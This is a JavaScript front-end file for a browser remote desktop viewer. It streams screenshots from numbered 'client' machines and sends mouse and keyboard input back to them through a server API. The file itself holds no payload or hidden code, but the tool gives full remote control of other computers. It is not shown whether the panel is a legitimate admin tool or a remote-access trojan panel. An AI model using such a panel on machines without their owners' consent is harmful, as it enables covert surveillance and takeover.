// language: JavaScript, file: public/js/rdp.js
const $ = (id) => document.getElementById(id);
const params = new URLSearchParams(location.search);

const clientId = Number(params.get('id'));
const hostName = params.get('host') || `client ${clientId}`;
const hostIp   = params.get('ip') || '';

$('target').textContent = `${hostName} @ ${hostIp}`;

let cfg = { width: 1280, height: 720, quality: 50, fps: 10, keyboard: true, mouse: true };
let running = false;
let lastMouseSent = 0;
let framesThisSec = 0;
let lastFpsTick = Date.now();

const PRESETS = {
  low:  { width: 960,  height: 540, quality: 35, fps: 8  },
  med:  { width: 1280, height: 720, quality: 55, fps: 10 },
  high: { width: 1600, height: 900, quality: 75, fps: 15 },
};

const img = document.createElement('img');
img.draggable = false;

img.addEventListener('load', () => {
  $('dot').classList.add('on');
  $('dot').classList.remove('off');
  framesThisSec++;
  const now = Date.now();
  if (now - lastFpsTick >= 1000) {
    $('fps').textContent = `${framesThisSec} fps`;
    framesThisSec = 0;
    lastFpsTick = now;
  }
});
img.addEventListener('error', () => {
  $('dot').classList.remove('on');
  $('dot').classList.add('off');
});

function showImage() {
  const stage = $('stage');
  stage.innerHTML = '';
  stage.appendChild(img);
}

async function start() {
  const r = await fetch(`/api/clients/${clientId}/rdp/start`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(cfg),
  });
  if (!r.ok) { alert('rdp start failed'); return; }
  running = true;
  showImage();
  pump();
}

async function stop() {
  running = false;
  try {
    await fetch(`/api/clients/${clientId}/rdp/stop`, { method: 'POST' });
  } catch {}
}

async function pump() {
  while (running) {
    try {
      const t = Date.now();
      await new Promise((resolve) => {
        const tmp = new Image();
        tmp.onload = () => { img.src = tmp.src; resolve(); };
        tmp.onerror = () => resolve();
        tmp.src = `/api/clients/${clientId}/screen?t=${t}`;
      });
    } catch {}
    // pace to target fps
    const interval = 1000 / Math.max(cfg.fps, 1);
    const elapsed = Date.now() - (img.dataset.lastFetch || 0);
    img.dataset.lastFetch = Date.now();
    if (elapsed < interval) await new Promise(r => setTimeout(r, interval - elapsed));
  }
}

// ---------- preset ----------
$('preset').addEventListener('change', (e) => {
  const p = PRESETS[e.target.value];
  if (!p) return;
  Object.assign(cfg, p);
  // restart stream with new settings
  if (running) {
    stop().then(() => setTimeout(start, 200));
  }
});

// ---------- keyboard ----------
$('kb').addEventListener('click', () => {
  cfg.keyboard = !cfg.keyboard;
  $('kb').classList.toggle('active', cfg.keyboard);
  $('kb').textContent = cfg.keyboard ? '⌨ on' : '⌨ off';
});

// ---------- mouse toggle ----------
$('mouse').addEventListener('click', () => {
  cfg.mouse = !cfg.mouse;
  $('mouse').classList.toggle('active', cfg.mouse);
  $('mouse').textContent = cfg.mouse ? '🖱 on' : '🖱 off';
});

// ---------- input senders ----------
function sendInput(payload) {
  fetch(`/api/clients/${clientId}/input`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
    keepalive: true,
  }).catch(() => {});
}

function norm(e) {
  const r = img.getBoundingClientRect();
  const x = (e.clientX - r.left) / r.width;
  const y = (e.clientY - r.top)  / r.height;
  return { x: Math.max(0, Math.min(1, x)), y: Math.max(0, Math.min(1, y)) };
}

img.addEventListener('mousemove', (e) => {
  if (!cfg.mouse) return;
  const now = performance.now();
  if (now - lastMouseSent < 30) return;   // ~30fps mouse
  lastMouseSent = now;
  const p = norm(e);
  sendInput({ type: 'mouse_move', x: p.x, y: p.y });
});

img.addEventListener('mousedown', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_down', button: btnName(e.button) });
});

img.addEventListener('mouseup', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_up', button: btnName(e.button) });
});

img.addEventListener('contextmenu', (e) => e.preventDefault());

img.addEventListener('wheel', (e) => {
  if (!cfg.mouse) return;
  e.preventDefault();
  sendInput({ type: 'mouse_wheel', dy: Math.sign(e.deltaY) });
}, { passive: false });

document.addEventListener('keydown', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: true });
});

document.addEventListener('keyup', (e) => {
  if (!cfg.keyboard) return;
  if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
  e.preventDefault();
  sendInput({ type: 'key', code: e.code, key: e.key, down: false });
});

function btnName(b) { return b === 2 ? 'right' : b === 1 ? 'middle' : 'left'; }

// ---------- disconnect ----------
$('stop').addEventListener('click', async () => {
  await stop();
  window.close();
});

window.addEventListener('beforeunload', () => { stop(); });

// ---------- go ----------
start();